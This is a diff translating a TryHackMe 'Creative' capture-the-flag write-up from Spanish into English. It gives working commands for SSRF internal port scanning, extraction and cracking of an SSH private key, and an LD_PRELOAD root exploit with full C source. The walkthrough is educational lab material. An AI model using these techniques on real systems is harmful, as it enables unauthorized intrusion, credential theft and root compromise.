@@ -1,27 +1,27 @@
 # Creative — TryHackMe Writeup
 
-**Dificultad:** Easy  
+**Difficulty:** Easy  
 **OS:** Linux  
-**Técnicas:** SSRF · Port Forwarding Interno · SSH Key Extraction · LD_PRELOAD Privesc
+**Techniques:** SSRF · Internal Port Forwarding · SSH Key Extraction · LD_PRELOAD Privesc
 
 ---
 
-## 1. Reconocimiento
+## 1. Reconnaissance
 
-### Escaneo de puertos
+### Port Scanning
 
 ```bash
 nmap -sVC -p- --min-rate 5000 $TARGET -oN service.txt
 ```
 
-**Resultado relevante:**
+**Relevant Output:**
 ```
 22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
 80/tcp open  http  nginx 1.18.0 (Ubuntu)
-          → Redirige a http://creative.thm (Virtual Hosting)
+          → Redirects to http://creative.thm (Virtual Hosting)
 ```
 
-El servidor usa **virtual hosting**, añadimos el dominio al `/etc/hosts`:
+The server uses **virtual hosting**, so we add the domain to `/etc/hosts`:
 
 ```bash
 echo "$TARGET creative.thm" | sudo tee -a /etc/hosts
@@ -29,9 +29,9 @@ echo "$TARGET creative.thm" | sudo tee -a /etc/hosts
 
 ---
 
-## 2. Enumeración Web
+## 2. Web Enumeration
 
-### Fuzzing de directorios
+### Directory Fuzzing
 
 ```bash
 feroxbuster -u http://creative.thm \
@@ -39,9 +39,9 @@ feroxbuster -u http://creative.thm \
   --status-codes 200,301
 ```
 
-### Fuzzing de Virtual Hosts
+### Virtual Host Fuzzing
 
-Buscamos subdominios que no conozcamos aún:
+We look for unknown subdomains:
 
 ```bash
 gobuster vhost -u http://creative.thm \
@@ -49,39 +49,37 @@ gobuster vhost -u http://creative.thm \
   --append-domain
 ```
 
-**Encontramos:** `beta.creative.thm` → Status 200
+**Found:** `beta.creative.thm` → Status 200
 
 ```bash
 echo "$TARGET beta.creative.thm" | sudo tee -a /etc/hosts
 ```
 
-### Análisis del subdominio
+### Subdomain Analysis
 
 ```bash
 curl http://beta.creative.thm/
 ```
 
-La página expone un **URL Tester**: un formulario que recibe una URL,
-hace la petición desde el servidor y devuelve el contenido.
-Esto es un vector claro de **SSRF (Server-Side Request Forgery)**.
+The page exposes a **URL Tester**: a form that takes a URL, makes the request from the server, and returns the content.
+This is a clear **SSRF (Server-Side Request Forgery)** vector.
 
 ---
 
-## 3. Explotación — SSRF
+## 3. Exploitation — SSRF
 
-### Confirmación del SSRF
+### SSRF Confirmation
 
 ```bash
 curl -s -X POST "http://beta.creative.thm" \
   -d "url=http://127.0.0.1"
 ```
 
-El servidor devuelve la web de `creative.thm` — confirma que está
-haciendo peticiones internas desde sí mismo.
+The server returns the `creative.thm` website — confirming it is making internal requests to itself.
 
-### Descubrimiento de puertos internos
+### Internal Port Discovery
 
-Automatizamos el escaneo de todos los puertos via SSRF:
+We automate scanning all ports via SSRF:
 
 ```bash
 seq 1 65535 | xargs -P 100 -I{} bash -c '
@@ -89,36 +87,35 @@ seq 1 65535 | xargs -P 100 -I{} bash -c '
     -d "url=http://127.0.0.1:{}" \
     -H "Content-Type: application/x-www-form-urlencoded")
   if ! echo "$result" | grep -qE "Dead|^$"; then
-    echo "[OPEN] Puerto {}"
+    echo "[OPEN] Port {}"
     echo "$result" | head -c 300
   fi
 ' 2>/dev/null
 ```
 
-**Resultado:**
+**Result:**
 ```
-[OPEN] Puerto 1337
+[OPEN] Port 1337
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"...>
-→ Directory listing del sistema de archivos
+→ Filesystem directory listing
 ```
 
-El puerto **1337** expone internamente un **servidor HTTP con directory listing**,
-no accesible desde fuera — solo reachable vía SSRF.
+Port **1337** exposes an internal **HTTP server with directory listing**, not accessible from the outside — only reachable via SSRF.
 
-### Extracción de clave SSH privada
+### SSH Private Key Extraction
 
-Navegamos el sistema de archivos a través del SSRF:
+We browse the filesystem through the SSRF:
 
 ```bash
-# Ver el directorio home
+# View the home directory
 curl -s -X POST "http://beta.creative.thm" \
   -d "url=http://127.0.0.1:1337/home"
 
-# Listar el home de saad
+# List saad's home
 curl -s -X POST "http://beta.creative.thm" \
   -d "url=http://127.0.0.1:1337/home/saad/.ssh/"
 
-# Descargar la clave privada SSH
+# Download the SSH private key
 curl -s -X POST "http://beta.creative.thm" \
   -d "url=http://127.0.0.1:1337/home/saad/.ssh/id_rsa" > saad_key
 
@@ -127,20 +124,20 @@ chmod 600 saad_key
 
 ---
 
-## 4. Acceso Inicial — SSH
+## 4. Initial Access — SSH
 
 ```bash
 ssh saad@$TARGET -i saad_key
 ```
 
-La clave tiene **passphrase**. La crackeamos con john:
+The key has a **passphrase**. We crack it with john:
 
 ```bash
 ssh2john saad_key > saad_key.hash
 john saad_key.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-**Passphrase encontrada:** `sweetness`
+**Passphrase found:** `sweetness`
 
 ```bash
 ssh saad@$TARGET -i saad_key
@@ -154,58 +151,54 @@ cat ~/user.txt
 
 ---
 
-## 5. Escalada de Privilegios
+## 5. Privilege Escalation
 
-### Enumeración post-explotación
+### Post-Exploitation Enumeration
 
 ```bash
 cat ~/.bash_history
 ```
 
-El historial revela credenciales en texto plano:
+The history reveals plaintext credentials:
 
 ```
 echo "saad:MyStrongestPasswordYet$4291" > creds.txt
-rm creds.txt   ← intentó borrarlas pero el historial las guardó
+rm creds.txt   ← tried to delete them but history saved it
 ```
 
-### Análisis de sudo
+### Sudo Analysis
 
 ```bash
 sudo -l
 # Password: MyStrongestPasswordYet$4291
 ```
 
-**Resultado crítico:**
+**Critical Result:**
 ```
 env_reset, env_keep+=LD_PRELOAD
 (root) NOPASSWD: /usr/bin/ping
 ```
 
-Dos configuraciones peligrosas en `/etc/sudoers`:
+Two dangerous configurations in `/etc/sudoers`:
 
-| Configuración | Problema |
+| Configuration | Problem |
 |---|---|
-| `env_keep+=LD_PRELOAD` | sudo NO elimina esa variable del entorno |
-| `(root) /usr/bin/ping` | Saad puede ejecutar ping como root |
+| `env_keep+=LD_PRELOAD` | sudo DOES NOT strip this variable from the environment |
+| `(root) /usr/bin/ping` | Saad can run ping as root |
 
 ### LD_PRELOAD Privilege Escalation
 
-**¿Por qué funciona?**
+**Why does it work?**
 
-`LD_PRELOAD` permite cargar una librería `.so` antes que cualquier otra
-al ejecutar un programa. Normalmente sudo la elimina, pero aquí está
-explícitamente conservada (`env_keep`). Al ejecutar ping como root,
-nuestra librería se carga con privilegios de root antes de que ping
-arranque, dándonos una shell.
+`LD_PRELOAD` allows loading a `.so` library before any other when executing a program. Normally, sudo strips it, but here it is explicitly kept (`env_keep`). When running ping as root, our library is loaded with root privileges before ping starts, granting us a shell.
 
 ```
-saad (usuario normal)
+saad (normal user)
      │
      └─► sudo LD_PRELOAD=shell.so /usr/bin/ping
                │
                ▼
-          Linux carga shell.so  ← nuestro código
+          Linux loads shell.so  ← our code
                │
                ▼
           _init() → setuid(0) → setgid(0)
@@ -217,31 +210,31 @@ saad (usuario normal)
 **Exploit:**
 
 ```bash
-# 1. Crear la librería maliciosa en C
+# 1. Create the malicious C library
 cat > /tmp/shell.c << 'EOF'
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 
 void _init() {
-    unsetenv("LD_PRELOAD"); // Limpiar para evitar bucles en procesos hijos
-    setuid(0);              // Escalar UID a root
-    setgid(0);              // Escalar GID a root
-    system("/bin/bash -p"); // Lanzar bash manteniendo privilegios (-p)
+    unsetenv("LD_PRELOAD"); // Clean up to avoid loops in child processes
+    setuid(0);              // Escalate UID to root
+    setgid(0);              // Escalate GID to root
+    system("/bin/bash -p"); // Launch bash preserving privileges (-p)
 }
 EOF
 
-# 2. Compilar como shared library (.so)
-# -fPIC       → Position Independent Code (obligatorio para .so)
-# -shared     → genera librería, no ejecutable
-# -nostartfiles → sin main() estándar
+# 2. Compile as shared library (.so)
+# -fPIC       → Position Independent Code (mandatory for .so)
+# -shared     → generates library, not executable
+# -nostartfiles → without standard main()
 gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c
 
-# 3. Ejecutar ping con nuestra librería precargada
+# 3. Run ping with our preloaded library
 sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
 ```
 
-**Verificación:**
+**Verification:**
 
 ```bash
 id
@@ -252,18 +245,18 @@ cat /root/root.txt
 
 ---
 
-## 6. Resumen de Vulnerabilidades
+## 6. Vulnerability Summary
 
-| # | Vulnerabilidad | Ubicación | Impacto |
+| # | Vulnerability | Location | Impact |
 |---|---|---|---|
-| 1 | SSRF | beta.creative.thm | Acceso a servicios internos |
-| 2 | Directory listing | Puerto interno 1337 | Lectura arbitraria de archivos |
-| 3 | Credenciales en bash_history | ~/.bash_history | Contraseña de saad en texto plano |
-| 4 | sudo env_keep+=LD_PRELOAD | /etc/sudoers | Escalada completa a root (CWE-426) |
+| 1 | SSRF | beta.creative.thm | Access to internal services |
+| 2 | Directory listing | Internal port 1337 | Arbitrary file read |
+| 3 | Credentials in bash_history | ~/.bash_history | Saad's plaintext password |
+| 4 | sudo env_keep+=LD_PRELOAD | /etc/sudoers | Full escalation to root (CWE-426) |
 
 ---
 
-## 7. Referencias
+## 7. References
 
 - [GTFOBins — LD_PRELOAD](https://gtfobins.github.io)
 - [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz)
